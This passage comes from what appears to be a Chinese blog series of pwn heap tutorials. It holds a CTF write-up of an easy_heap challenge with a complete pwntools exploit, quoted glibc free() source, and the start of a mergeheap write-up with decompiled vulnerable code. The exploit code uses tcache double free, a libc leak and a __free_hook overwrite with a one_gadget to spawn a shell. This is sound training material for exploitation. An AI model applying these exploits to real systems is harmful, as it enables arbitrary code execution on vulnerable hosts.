<h4 id="申请0xf8-让剩余的unsortbin对齐到第0块chunk"><a href="#申请0xf8-让剩余的unsortbin对齐到第0块chunk" class="headerlink" title="申请0xf8,让剩余的unsortbin对齐到第0块chunk"></a>申请0xf8,让剩余的unsortbin对齐到第0块chunk</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chunk-7</span></span><br><span class="line"></span><br><span class="line">puts(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这时候我们puts(0)就可以泄露了，</p>
<h4 id="后面简单的double-free"><a href="#后面简单的double-free" class="headerlink" title="后面简单的double free"></a>后面简单的double free</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0 chunk-9</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chunk-7</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这里有个注意的地方，free(1)这里看好</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4194</span>    ------------------------------ <span class="built_in">free</span> ------------------------------</span><br><span class="line"><span class="number">4195</span>  */</span><br><span class="line"><span class="number">4196</span> </span><br><span class="line"><span class="number">4197</span> <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">4198</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line"><span class="number">4199</span> &#123;</span><br><span class="line"><span class="number">4200</span>   INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4201</span>   mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line"><span class="number">4202</span>   mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line"><span class="number">4203</span>   INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4204</span>   <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line"><span class="number">4205</span>   INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line"><span class="number">4206</span>   mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4207</span>   mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4208</span> </span><br><span class="line"><span class="number">4209</span>   size = chunksize (p);</span><br><span class="line"><span class="number">4210</span> </span><br><span class="line"><span class="number">4211</span>   <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">4212      allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">4213      Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">4214      here by accident or by "design" from some intruder.  */</span></span><br><span class="line"><span class="number">4215</span>   <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line"><span class="number">4216</span>       || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line"><span class="number">4217</span>     malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"><span class="number">4218</span>   <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">4219      multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="number">4220</span>   <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line"><span class="number">4221</span>     malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"><span class="number">4222</span> </span><br><span class="line"><span class="number">4223</span>   check_inuse_chunk(av, p);</span><br><span class="line"><span class="number">4224</span> </span><br><span class="line"><span class="number">4225</span> <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="number">4226</span>   &#123;</span><br><span class="line"><span class="number">4227</span>     <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"><span class="number">4228</span> </span><br><span class="line"><span class="number">4229</span>     <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line"><span class="number">4230</span>     tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"><span class="number">4231</span> </span><br><span class="line"><span class="number">4232</span>     <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">4233        trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">4234        2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence</span></span><br><span class="line"><span class="comment">4235        before aborting.  */</span></span><br><span class="line"><span class="number">4236</span>     <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line"><span class="number">4237</span>       &#123;</span><br><span class="line"><span class="number">4238</span>         tcache_entry *tmp;</span><br><span class="line"><span class="number">4239</span>         LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line"><span class="number">4240</span>         <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"><span class="number">4241</span>              tmp;</span><br><span class="line"><span class="number">4242</span>              tmp = tmp-&gt;next)</span><br><span class="line"><span class="number">4243</span>           <span class="keyword">if</span> (tmp == e)</span><br><span class="line"><span class="number">4244</span>             malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line"><span class="number">4245</span>         <span class="comment">/* If we get here, it was a coincidence.  We've wasted a few</span></span><br><span class="line"><span class="comment">4246            cycles, but don't abort.  */</span></span><br><span class="line"><span class="number">4247</span>       &#125;</span><br><span class="line"><span class="number">4248</span> </span><br><span class="line"><span class="number">4249</span>     <span class="keyword">if</span> (tcache</span><br><span class="line"><span class="number">4250</span>         &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line"><span class="number">4251</span>         &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line"><span class="number">4252</span>       &#123;</span><br><span class="line"><span class="number">4253</span>         tcache_put (p, tc_idx);</span><br><span class="line"><span class="number">4254</span>         <span class="keyword">return</span>;</span><br><span class="line"><span class="number">4255</span>       &#125;</span><br><span class="line"><span class="number">4256</span>   &#125;</span><br><span class="line"><span class="number">4257</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>源码在最后一部分检查了tcache的数量，所以free的时候得使tcache的数量对的上。</p>
<p>说多了都是泪，简单题做着不简单，花了好长时间</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#功能性测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    malloc(<span class="number">0x20</span>, <span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># tcache-0</span></span><br><span class="line">    <span class="comment"># tcache-1</span></span><br><span class="line">    <span class="comment"># tcache-2</span></span><br><span class="line">    <span class="comment"># tcache-3</span></span><br><span class="line">    <span class="comment"># tcache-4</span></span><br><span class="line">    <span class="comment"># tcache-5</span></span><br><span class="line">    <span class="comment"># unsorted - 6</span></span><br><span class="line">    <span class="comment"># unsorted - 7</span></span><br><span class="line">    <span class="comment"># unsorted - 8</span></span><br><span class="line">    <span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-1</span></span><br><span class="line">    <span class="comment"># chunk - 7</span></span><br><span class="line">    <span class="comment"># chunk - 8</span></span><br><span class="line">    <span class="comment"># chunk - 9</span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">    malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">    free(<span class="number">6</span>) <span class="comment"># free into tcache, so we can use unsortbin consolidate</span></span><br><span class="line">    free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap </span></span><br><span class="line">    <span class="comment"># chunk-6   tcache</span></span><br><span class="line">    <span class="comment"># chunk-5   tcache</span></span><br><span class="line">    <span class="comment"># chunk-4   tcache</span></span><br><span class="line">    <span class="comment"># chunk-3   tcache</span></span><br><span class="line">    <span class="comment"># chunk-2   tcache</span></span><br><span class="line">    <span class="comment"># chunk-1   tcache</span></span><br><span class="line">    <span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line">    <span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line">    <span class="comment"># chunk - 9 unsorted</span></span><br><span class="line">    <span class="comment"># chunk-0   tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line"></span><br><span class="line">    puts(<span class="number">0</span>)</span><br><span class="line">    libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now the heap</span></span><br><span class="line">    <span class="comment"># chunk-1 </span></span><br><span class="line">    <span class="comment"># chunk-2</span></span><br><span class="line">    <span class="comment"># chunk-3</span></span><br><span class="line">    <span class="comment"># chunk-4</span></span><br><span class="line">    <span class="comment"># chunk-5</span></span><br><span class="line">    <span class="comment"># chunk-6</span></span><br><span class="line">    <span class="comment"># chunk-8 </span></span><br><span class="line">    <span class="comment"># chunk-0 chunk-9</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># chunk-7</span></span><br><span class="line">    free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">    free(<span class="number">0</span>) </span><br><span class="line">    free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">    malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">    io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h2><p>vmmap 这个命令可以指定具体想要查看的内容，比如</p>
<ol>
<li>vmmap libc</li>
<li>vmmap heap</li>
<li>vmmap stack</li>
<li>vmmap map</li>
</ol>
<p>tcache是FILO,跟栈是类似的</p>
<p>patchelf 可以指定版本libc, 这样可以调试带符号的libc，加上glibc-all-in-one这个项目或者自己去下载glibc就可以用pwndbg的那些heap  bins等命令了<br>具体如下：<br>patchelf –set-interpreter libc目录/ld-2.27.so –set-rpath libc目录 文件名</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>加入tcache后攻击方法变得相对简单，堆块的申请却变得复杂了，因为在leak的时候要考虑tcache，以及构造的时候也要考虑tcache</li>
<li>我觉得不需要跟我一样标注出每个堆块的位置，我只是学习tcache，所以标注出来方便自己看</li>
<li>堆块重用这部分经常都是跟off-by-one结合起来</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#challenge-1-lctf2018-pwn-easy_heap" target="_blank" rel="noopener">ctf-wiki</a></p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程6</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程6"><a href="#pwn堆入门系列教程6" class="headerlink" title="pwn堆入门系列教程6"></a>pwn堆入门系列教程6</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a><br><a href="https://xz.aliyun.com/t/6322" target="_blank" rel="noopener">pwn堆入门系列教程4</a><br><a href="https://xz.aliyun.com/t/6377" target="_blank" rel="noopener">pwn堆入门系列教程5</a></p><p>要将别人的东西转化成自己的东西，还是得实操，自己去操作番才可以得到些东西，学了这么久，这几天的比赛也算是用上了，有unlink，有double free，这些操作用上了</p><h2 id="2019护网杯-mergeheap"><a href="#2019护网杯-mergeheap" class="headerlink" title="2019护网杯 mergeheap"></a>2019护网杯 mergeheap</h2><a id="more"></a>

<p>我每次看到题目名字跟函数名字相同，我就知道点就在那个函数上，然而我当时已经看出这里有溢出了，然后调试的时候以为没覆盖到，原来只能覆盖到size，还是脑子不清晰，所以才会这样</p>
<h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ol>
<li>新建一个堆块</li>
<li>展示堆块内容</li>
<li>删除一个堆块</li>
<li>合并两个堆块内容</li>
<li>退出</li>
</ol>
<p>乍一看就只有合并比较可疑了，通常堆题没合并，而题目又是mergeheap</p>
<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_E29</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">14</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"full"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx1:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">14</span> || !qword_2020A0[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx2:"</span>);</span><br><span class="line">  v3 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">14</span> || !qword_2020A0[v3] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  v4 = dword_202060[v2] + dword_202060[v3];</span><br><span class="line">  qword_2020A0[i] = <span class="built_in">malloc</span>(v4);</span><br><span class="line">  <span class="built_in">strcpy</span>(qword_2020A0[i], qword_2020A0[v2]);</span><br><span class="line">  <span class="built_in">strcat</span>(qword_2020A0[i], qword_2020A0[v3]);</span><br><span class="line">  dword_202060[i] = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>merge这里的strcpy跟strcat都是遇到\x00结束的，所以，我们如果将下一个堆块的pre_size当数据段来用的话，就可以复制到size部分，merge的时候会覆盖到下一个堆块的size，溢出覆盖size</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D72</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"idx:"</span>);</span><br><span class="line">  v2 = sub_B8B();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">14</span> &amp;&amp; qword_2020A0[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(qword_2020A0[v2]);</span><br><span class="line">    qword_2020A0[v2] = <span class="number">0L</span>L;</span><br><span class="line">    v0 = dword_202060;</span><br><span class="line">    dword_202060[v2] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free过后，堆块内容未清空，也就是说，我们申请一个堆块，然后free掉，在申请到这个堆块时候，就可以查看原来堆块的内容</p>
<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>初始化堆块操作</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> len(content) != size:</span><br><span class="line">        io.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1, idx2)</span>:</span></span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.sendline(str(idx1))</span><br><span class="line">    io.sendline(str(idx2))</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>填满tcache，并利用unsortbin泄露libc地址</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x100</span>, str(i)*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">0x8</span>, <span class="string">'0'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">"0"</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3ebda0</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br></pre></td></tr></table></figure>

<p>我反过来删除是因为show好弄些，也可以正向删除，show(7)</p>
<ol start="3">
<li>重点，这里的大小要构造好，被复制和被覆盖的得分清楚，最后造成overlap chunk，然后修改tcache的fd指针成malloc_hook就行了，这里跟fastbin不太相似，fastbin这种攻击大小限制得是0x70大小chunk，因为错位的时候只有0x7f通常</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0xe0</span>, <span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'2'</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'3'</span>*<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>) <span class="comment">#4 被复制的size</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'5'</span>*<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'6'</span>*<span class="number">0x20</span>) <span class="comment">#6 size部分将被覆盖</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">merge(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">add(<span 